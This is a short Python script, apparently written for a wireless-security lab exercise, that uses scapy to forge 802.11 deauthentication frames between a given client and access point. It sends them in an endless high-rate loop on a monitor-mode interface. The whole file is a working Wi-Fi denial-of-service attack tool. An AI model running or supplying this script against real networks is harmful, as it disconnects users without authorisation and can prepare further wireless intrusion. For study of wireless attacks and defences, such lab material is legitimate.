#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""
Created on 17.02.2020

@author: Basile Botebol
"""
import sys
from scapy.all import *


def deauth(target_client, target_ap, code):
    # Dans un premier temps, on forge le paquet avec le reason code fourni
    dot11 = Dot11(addr1=target_ap, addr2=target_client, addr3=target_ap)
    packet = RadioTap()/dot11/Dot11Deauth(reason=code)

    #Puis on l'envoie avec la fonciton sendp en boucle
    sendp(packet, inter=0.00000001, count=10000000, iface="wlan0mon", loop=1, verbose=1)


def main(argv):
    deauth(argv[0], argv[1], int(argv[2]))



if __name__ == "__main__":
    main(sys.argv[1:])
